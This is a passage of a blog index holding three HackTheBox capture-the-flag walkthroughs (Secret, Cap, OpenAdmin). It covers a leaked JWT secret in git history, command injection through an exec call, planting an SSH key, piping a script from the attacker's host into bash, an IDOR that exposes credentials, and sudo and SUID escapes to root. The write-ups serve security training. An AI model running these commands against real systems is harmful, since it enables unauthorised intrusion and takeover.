verified you will get an “access denied”.Let’s verify our role. We should expect to see “you are a normal user” when we make a GET request to /api/priv with the auth-token header set.As expected, we see that we are a normal user at the moment. Besides that, we don’t have anything else to go off of right now, and our dirb didn’t find anything particularly useful.http://10.10.11.120/download (CODE:301|SIZE:183) + http://10.10.11.120/docs (CODE:200|SIZE:20720) + http://10.10.11.120/assets (CODE:301|SIZE:179) + http://10.10.11.120/api (CODE:200|SIZE:93) + http://10.10.11.120/Docs (CODE:200|SIZE:20720) + http://10.10.11.120/API (CODE:200|SIZE:93) + http://10.10.11.120/DOCS (CODE:200|SIZE:20720)Let’s download the source code and see what’s going on here.Right away, we see that the .env file has not been excluded. A short read up here explains why this is generally bad practice. Aside from that, we can see the routes that the website uses and the code for the different functions that we just tried like registering and logging in.Doing a git log shows us previous commit messages.git log commit e297a2797a5f62b6011654cf6fb6ccb6712d2d5b (HEAD -&gt; master)Author: dasithsv &lt;dasithsv@gmail.com&gt;Date: Thu Sep 9 00:03:27 2021 +0530 now we can view logs from server 😃commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78Author: dasithsv &lt;dasithsv@gmail.com&gt;Date: Fri Sep 3 11:30:17 2021 +0530 removed .env for security reasonscommit de0a46b5107a2f4d26e348303e76d85ae4870934Author: dasithsv &lt;dasithsv@gmail.com&gt;Date: Fri Sep 3 11:29:19 2021 +0530 added /downloadscommit 4e5547295cfe456d8ca7005cb823e1101fd1f9cbAuthor: dasithsv &lt;dasithsv@gmail.com&gt;Date: Fri Sep 3 11:27:35 2021 +0530 removed swapcommit 3a367e735ee76569664bf7754eaaade7c735d702Author: dasithsv &lt;dasithsv@gmail.com&gt;Date: Fri Sep 3 11:26:39 2021 +0530 added downloadscommit 55fe756a29268f9b4e786ae468952ca4a8df1bd8Author: dasithsv &lt;dasithsv@gmail.com&gt;Date: Fri Sep 3 11:25:52 2021 +0530 first commitWe can see that the .env file was removed for security reasons, let’s check out why by doing a git diff HEAD~2git diff HEAD~2diff --git a/.env b/.envindex fb6f587..31db370 100644--- a/.env+++ b/.env@@ -1,2 +1,2 @@ DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE+TOKEN_SECRET = secretdiff --git a/routes/private.js b/routes/private.jsindex 1347e8c..cf6bf21 100644--- a/routes/private.js+++ b/routes/private.js@@ -11,10 +11,10 @@ router.get('/priv', verifytoken, (req, res) =&gt; { if (name == 'theadmin'){ res.json({- role:{-- role:\"you are admin\", - desc : \"{flag will be here}\"+ creds:{+ role:\"admin\", + username:\"theadmin\",+ desc : \"welcome back admin,\" } }) }@@ -26,7 +26,32 @@ router.get('/priv', verifytoken, (req, res) =&gt; { } }) }+})+ +router.get('/logs', verifytoken, (req, res) =&gt; {+ const file = req.query.file;+ const userinfo = { name: req.user }+ const name = userinfo.name.name;+ + if (name == 'theadmin'){+ const getLogs = `git log --oneline ${file}`;+ exec(getLogs, (err , output) =&gt;{+ if(err){+ res.status(500).send(err);+ return+ }+ res.json(output);+ })+ }+ else{+ res.json({We can see that the JWT secret was included in the commit. We can learn more about JWT tokens and how to construct and deconstruct them here. Let’s take this token secret and see if we can use it to forge a token that will give us more privilege.FootholdFrom the /priv route in the source code, we can see that the administrator username is hardcoded as “theadmin”.Further down, we can see that if we are admin, we can pass commands in a get request to the /logs endpoint that get passed to the server and executed as bash commands: effectively a shell. See where this is going?We have a plan now: take the stolen JWT secret and forge an admin token with it, then use that token to get RCE from the /logs endpoint. Let’s forge our token, remember, as long as the name is “theadmin” and the token secret is correct, we should get a valid admin token.We submit this token to the /priv endpoint to check if our token is valid:Looks good, let’s get that RCE now.Nice, let’s go for a reverse shell and grab the user flag now. Since SSH is open on the box, we can try dropping our public key in the authorized_keys file. We use SSH-keygen to make a new key.We must construct a payload now that will upload our key to the target. We use mkdir with the -p argument to make the .ssh directory on the target if it doesn’t already exist, and echo our public key to the authorized_keys file within that directory.mkdir -p /home/dasith/.ssh; echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCTcMliTv2GtoJTymEhqEHzqpzOo/7qU9eODpzakrGOQvn2aA7epSxSmNtnAfPnmT6wwDcR/bq7lsirRNBWdb1sKGYRKIY85jANZHqWHqC8FGMJu0F7UrBCCPKa/kwugZLyhgaR72QGvk5CnocX6UnDowtvY7jrJZboq/ESArnISNHRqc1ZUzWXElyt0AT8m/N8/LJKlN5zGU/cBDiUqJQ+pWbLs/MG9apeLOo46+BlSoBbS7iPsRRtyMEOOw4XvyfBxQOn9ZohlShxq4bnne4OEe4lmQr92SY1Vc9sUUOP9wyPH2chJFm9LJXAragja0YTFT6mt2aeGf0HjpjE+kXVXpoiadZ4ai/BUfM1bUtrAleUrmbEanNny8f5QaC65hxhnxnVtlgkhJCnSmajdiAW+zK7C0KYYSI0jHmkddSBGaWmpIbarqz97Md1y2BrJGxtg3CJlWw48vRw8NdtSpwu0EPEnaecS3KzN9JhsBYqlMsVopB8Vzq7kAyZe2XVjYs= kali@kali\" &gt;&gt; /home/dasith/.ssh/authorized_keys\" Let’s URL encode this and send it through burp with our admin token200 response - so far so good. We’ll know it was successful if we can SSH into the machine.User.txt is ours now! Let’s get linpeas running on the box now.As always we host it on a simple http server from our machine,curl it from the target machine,and pipe it to bash. Unfortunately, I got stuck at this section of the box for quite some time sifting through the linpeas output and trying to find a privesc vector. In the end, the answer was in the /opt directory.Privilege EscalationRunning the count program, it asks for a file, and then displays the amount of characters in that file. Because this application is owned by root, it should be able to read files owned by root. Let’s test by running the program on the root.txt file.33 characters is the length of an MD5 hash + a new line character, meaning the program does what it’s supposed to, but how can we use this to our benefit? We know that before the program can run, it needs to pull the file into memory. What happens if we just start the program and crash it before it’s done running?We load the root.txt file into memory, background the process with CTRL+Z, and kill the process with a segfault. If we go to /var/crash, we can see the crash dump.The dump can be unpacked with apport-unpack, and because the CoreDump file that’s produced is a binary, we need to use the strings command to sift through the readable information.Looking through the output, we find something that clearly resembles a 32 character hash, which is our root flag!Though we technically completed the box, I always prefer to actually get a shell as root rather than just grabbing the flag, this can be done by grabbing the root user’s private ssh key and using it to ssh into the box." }, { "title": "Cap", "url": "/posts/Cap/", "categories": "htb", "tags": "Linux, IDOR, Packet Capture, SUID Exploitation", "date": "2022-08-13 14:27:00 -0500", "snippet": "Cap is a pretty straight-forward easy level machine on HacktheBox that I had alot of fun completing. We start by finding an IDOR vulnerability on the web server which lets us grab a .pcap file from the past. Opening it with wireshark shows us credentials for a user on the machine, and from there we get to root through an SUID exploit.EnumerationStarting with NMAP, we see that FTP, SSH, and HTTP services are running on ports 21, 22, and 80.sudo nmap -sC 10.10.10.245Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-13 18:53 EDTNmap scan report for 10.10.10.245Host is up (0.052s latency).Not shown: 997 closed tcp ports (reset)PORT STATE SERVICE21/tcp open ftp22/tcp open ssh| ssh-hostkey: | 3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)| 256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)|_ 256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)80/tcp open http|_http-title: Security DashboardBefore we look at the website, it’s always a good idea to check if anonymous login is enabled on the FTP server.$ ftp 10.10.10.245Connected to 10.10.10.245.220 (vsFTPd 3.0.3)Name (10.10.10.245:kali): anonymous331 Please specify the password.Password: 530 Login incorrect.ftp: Login failedTurns out it’s disabled-let’s just check out the website,seems to be a security monitoring dashboard which contains information on the host’s internal network. Potential username on the right side “Nathan”.We can see the output of ifconfignetstatand most interestingly, an endpoint on http://10.10.10.245/data/1 that contains a (blank) pcap file from the past 5 seconds.Using the IDOR to Get Nathan’s CredentialsWhat happens however if we change the url to http://10.10.10.245/data/0 ?we get a packet capture from the past with an insecure direct object reference (IDOR).In this case, we can see an in-the-clear successful authentication attempt from Nathan to the FTP server, showing us his credentials. Using these credentials, we can login to the machine through SSH and grab the user flag.Privilege EscalationFrom here we can get linpeas on the box, an awesome script that looks for tons of priv-esc vectors. We start by serving linpeas.sh from our local machine on a simple python http server.Then from the victim’s machine we pull the script from our website and execute it automatically with:curl 10.10.14.17:8000/linpeas.sh | bashWe get a hit on our server from the victim’s IP address, and the script executes on the victim’s machine.Linpeas found something juicy:Nathan has the SUID bit on /usr/bin/python3.8, which can be used to get a root shell on the box with a trick from hackingarticles." }, { "title": "OpenAdmin", "url": "/posts/OpenAdmin/", "categories": "htb", "tags": "Linux, Password Reuse, Weak Credentials, Password Cracking, Lateral Movement, Source Code Review, Sudo Exploitation, Public Vulnerabilities", "date": "2022-08-10 19:25:00 -0500", "snippet": "OpenAdmin is a fun easy level box on HacktheBox, and will always have a special place in my heart as the first box I fully solved without needing a walkthrough. We begin by exploiting a vulnerable management console on the website to get a foothold, and ultimately abuse sudo priviledges to root the box.EnumerationTo begin, we run an nmap to look for open ports and running services on the target host.sudo nmap -sC -sV -p- 10.10.10.171 PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)| 256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)|_ 256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-title: Apache2 Ubuntu Default Page: It works|_http-server-header: Apache/2.4.29 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelLooks like it’s an Ubuntu server with SSH and HTTP open on ports 22 and 80. Before I poke around on the website, I’m going set up some directory brute forcing with dirb to look for any potentially hidden or interesting endpoints on the website.dirb http://10.10.10.171 /usr/share/wordlists/dirbuster/directory-list-2.3-small.txtAt first glance the web page doesn’t seem to actually contain any content, just a default apache2 index page.Luckily our dirb found the /music and /artwork directories, which do contain web content, though most of the links on the site just point back to index.html.A “login” button, however, redirects us to the /ona page, where it seems we have access to some sort of management console.ONA is a network management console, but after messing around here for a little, it doesn’t really seem like there’s much we can do. There’s default admin credentials in the ONA documentation, but logging in as admin still doesn’t give us much to work with. On google, we can learn that ONA has had some serious security vulnerabilities in the past. As a matter of fact, an exploit script for this exact version of ONA (18.1.1) is available on Github, which explains the warning on the left side of the web console.FootholdUsing this exploit, we can get a shell on the target as www-data! Let’s get a real shell now and see what we can find on the box.We send a bash reverse shell, the connection hangs, and a new connection pops up on our listener.This shell is not interactive, so we need to run some commands to upgrade itpython3 -c 'import pty; pty.spawn(\"/bin/bash\")'export TERM=screen(CTRL+Z)stty raw -echo; fgNow that we have our upgraded shell, we will begin by enumerating the /opt/ona/www directory that our shell spawned in.After further digging we find an interesting config file in /opt/ona/www/local/config called database_settings.inc.php, which contains plaintext credentials for a database user!From the /etc/passwd file we can see there are 2 users with logins on the box, Joanna and Jimmy.Pivoting to JimmyLet’s try logging into SSH with the password we found earlier, it’s possible that one of the users who created the db password reuses the same password for their own login, so we’ll check both Jimmy and Joanna.Success! We can now SSH into the machine as Jimmy, however the user flag is nowhere to be seen, looks like we’ll need to pivot to Joanna to get it. For now let’s carry on enumerating the box. Netstat shows us a port open locally on 52846.If I make a GET request to the port with curl, I get an HTML response, meaning a website is hosted on this port.However, I can’t visit this website from my machine because it is only being served internally on the target, meaning I have to tunnel my SSH connection in order to interact with the target’s internal services.ssh jimmy@10.10.10.171 -L 52846:127.0.0.1:52846Now when I visit http://127.0.0.1:52846, I can access the website that is being served internally on the target, neat!The credentials we found earlier don’t let us in, so let’s do some more digging for config files or anything that will give us a better idea of what’s happening behind the scenes on this website.The /var/www/internal directory contains the php source code of the website, and once again we find hard coded credentials, this time it’s a SHA512 hash in the index.php file.Using an online hash table we can see that the plaintext password for this hash is “Revealed”Logging in with our new found credentials takes us to /main.php, which is leaking Joanna’s SSH private key. We’ll grab this so we can SSH into the box as her.Pivoting to JoannaWe’ll want to crack this with John, which is pretty simple with some help from this guide.Following the guide further, we give the private key the proper permissions, and then use it along with the passphrase we got from john to authenticate to the SSH server. After pivoting 2 times, the user flag is finally ours!Privilege EscalationLuckily, the road to root is not far from here. Let’s first check if Joanna has sudo priviledges anywhere.Joanna has sudo access with nano inside of /opt/priv, we can exploit this to get root access using a nice trick from gtfobins.sudo /bin/nano /opt/priv(^R^X)reset; sh 1&gt;&amp;0 2&gt;&amp;0And just like that, we have a root shell within nano that we can use to grab the root flag." } ]
